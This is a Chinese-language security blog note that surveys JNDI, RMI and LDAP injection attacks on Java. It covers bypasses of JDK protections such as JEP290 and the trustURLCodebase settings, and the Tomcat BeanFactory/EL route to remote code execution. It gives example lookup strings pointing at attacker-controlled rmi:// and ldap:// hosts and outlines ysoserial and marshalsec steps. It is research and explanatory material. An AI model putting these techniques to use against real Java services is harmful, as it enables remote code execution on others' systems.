---
title: "JNDI、RMI、LDAP防御和绕过总结"
date: 2022-03-13T16:13:45+08:00
draft: true
image: 
description: 
comments: true
license: true
math: false
categories:
- note
tags:
- JNDI
- RMI
- LDAP
---

本篇原理分析较少，主要是总结梳理攻击，绕过手法

## 前置知识

### RMI调用流程

![17cd7c7d4f9ef2c362efb3086c27417e.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271610049.png)

RMI基于反序列化，每次数据交换都存在序列化-反序列化操作，由此延伸出对三端的攻击手法

### JNDI攻击手法

通常 JNDI 注入攻击的都是 lookup 方法的执行者，一般步骤如下：

1.  目标机器中调用了 `InitialContext.lookup(URL)`，且 URL 为用户可控
2.  攻击者控制这个 URL 为一个恶意的 RMI 服务地址：`rmi://hack:port/name`或者`ldap://xxx/xxx`
3.  恶意 RMI/ldap 服务会返回一个含有恶意 factory 的 Reference 对象或者直接返回恶意序列化数据

> - JNDI 注入可以通过 RMI 方式和 LDAP 方式来达到攻击效果。
> - javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit')
> - org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')

## **jdk8u121**

这个版本主要是ban掉了RMI的一些打法

1.  从jdk8u121开始，RMI加入了反序列化白名单机制(**[JEP290](https://www.twblogs.net/a/5e4efb52bd9eee101df6892d)**)
2.  在jdk8u121之后，对于Reference加载远程代码，jdk的信任机制，在通过rmi加载远程代码的时候，会判断环境变量`com.sun.jndi.rmi.object.trustURLCodebase`是否为true，而其在121版本及后，默认为false。RMI远程Reference代码攻击方式开始失效

### 白名单绕过（JEP290绕过）

可以看这篇：[RMI-JEP290的分析与绕过 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/259059)

为了绕过**JEP290**，ysoserial里面的JRMPClient链子，通过UnicastRef这个在RMI反序列化白名单内的gadget进行攻击：

1.  用`ysoserial`启动一个恶意的`JRMPListener`
2.  受害者启动注册中心(RMI Registry)
3.  攻击者启动Client调用`bind()`操作
4.  注册中心（受害者）被反序列化攻击

> 如果我们可以控制 UnicastRef 中 LiveRef 所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，这其实就是 ysoserial 中的 payloads.JRMPClient 的原理。
> 
> 实际上ysoserial这个JRMPClient和JRMPListener就是利用JRMP协议对打

攻击过程：
![0a195b875b83dececc1d8526523878e3.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271611301.png)

后续修复和绕过：

1.  绕过的修复版本：jdk8u231，在JDK8u231的`dirty`函数中多了`setObjectInputFilter`过程，所以用`UnicastRef`就没法再进行绕过了。
2.  `1.`修复版本的绕过：国外安全研究人员`@An Trinhs`发现了一个gadgets利用链，能够直接反序列化`UnicastRemoteObject`造成反序列化漏洞。参考：[RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT](https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1)

> 在上面的 Bypass 中，UnicastRef 类用了一层包装，通过递归的形式触发反序列化；通过 DGCClient 向 JRMPListener 发起 JRMP 请求，而这条 Gadget 是直接利用一次反序列化发起 JRMP 请求

3.  `2.`绕过的修复版本：jdk8u241，在调用`UnicastRef.invoke`之前，做了一个检测。声明方法的类，必须要实现`Remote`接口，然而这里的`RMIServerSocketFactory`并没有实现，于是无法进入到invoke方法，直接抛出错误。

### 使用ldap

在这个版本还没有ban掉ldap的Reference对象和ldap直接返回恶意序列化数据

### 服务端Object参数暴露

这个其实就是正常RMI Client攻击Server的手法。

例如，远程调用的接口 RemoteInterface 存在一个 sayGoodbye 方法的参数是 Object 类型。

![cad6d7a0109df4f446a58467d0dbf87c.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271612915.png)

RMI的传输100%基于反序列化，那我们就直接可以传一个反序列化 payload 进去执行反序列化。

如果参数不是Object还有后续绕过：

> 由于攻击者可以完全控制客户端，因此他可以用恶意对象替换从Object类派生的参数（例如String）有几种方法：
> 
> 1.  将java.rmi软件包的代码复制到新软件包，然后在其中更改代码
>     
> 2.  将调试器附加到正在运行的客户端，并在序列化对象之前替换对象
>     
> 3.  使用Javassist之类的工具更改字节码
>     
> 4.  通过实现代理来替换网络流上已经序列化的对象
>     

也被su18师傅称为替身攻击：

> 大体的思路就是调用的方法参数是 HelloObject，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。

afanti师傅用的是通过RASP hook住`java.rmi.server.RemoteObjectInvocationHandler`类的`InvokeRemoteMethod`方法的第三个参数非Object的改为Object的gadget。他的项目地址在[RemoteObjectInvocationHandler](https://github.com/Afant1/RemoteObjectInvocationHandler)。

## jdk8u191

这个版本ban掉了ldap的Reference对象

> 在jdk8u191之后，加入LDAP远程Reference代码信任机制，LDAP远程代码攻击方式开始失效，也就是系统变量`com.sun.jndi.ldap.object.trustURLCodebase`默认为false（CVE-2018-3149）

高版本绕过主要有两种方式：

- LDAP Server 直接返回恶意序列化数据，但需要目标环境存在 Gadget 依赖
  
- 使用本地 Factory 绕过（主要是利用了 `org.apache.naming.facotry.BeanFactory` 类）
  

### ldap直接返回序列化数据

1.  搭建恶意LDAP Server，可以直接改 [marshalsec](https://github.com/mbechler/marshalsec) 里面的：
2.  受害者 lookup 方法参数可控，执行 ldap://xxx/xxx

### 利用本地 Factory 绕过

在 Reference 类中的 factory Class，要求实现 ObjectFactory 接口，在 "NamingManager#getObjectFactoryFromReference" 方法中的逻辑是这样的：

1.  优先从本地加载 factory，这就要求 factory Class 在本地的 ClassPath 中
2.  本地加载不到会从 codebase 处加载，**但是由于高版本 jdk 默认不信任 codebase，在一般情况下无法利用**
3.  在加载完 factory 之后会强制类型转换为 `javax.naming.spi.ObjectFactory` 接口类型，之后调用 `factory.getObjectInstance()` 方法

所以如果找可以利用的 factory 就要满足下面的要求：

- 在目标的 ClassPath 中，且实现了 `javax.naming.spi.ObjectFactory` 接口
  
- 其 `getObjectInstance` 方法可以被利用
  

（其中一条Gadget）这个可用的 factory 类为 `org.apache.naming.BeanFactory`，位于 tomcat 的依赖包中，此外，这个 factory 绕过需要搭配 `javax.el.ELProcessor` 执行任意的 EL 表达式来完成 RCE，依赖：

```XML
 <dependency>
     <groupId>org.apache.tomcat</groupId>
     <artifactId>tomcat-catalina</artifactId>
     <version>8.5.0</version>
 </dependency>
 
 <!-- 加载ELProcessor时需要 -->
 <dependency>
     <groupId>org.apache.tomcat.embed</groupId>
     <artifactId>tomcat-embed-el</artifactId>
     <version>8.5.0</version>
 </dependency>
```

## Reference

[如何绕过高版本 JDK 的限制进行 JNDI 注入利用 - 安全客](https://paper.seebug.org/942/)

[RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT](https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1)

[RMI-JEP290的分析与绕过 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/259059)

[Bypass JEP290 - Y4er](https://y4er.com/post/bypass-jep290/)

[如何绕过高版本JDK的限制进行JNDI注入利用](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

[浅析高低版JDK下的JNDI注入及绕过 \[Mi1k7ea\]](https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/)

[JNDI注入分析 - 跳跳糖](https://tttang.com/archive/1611/)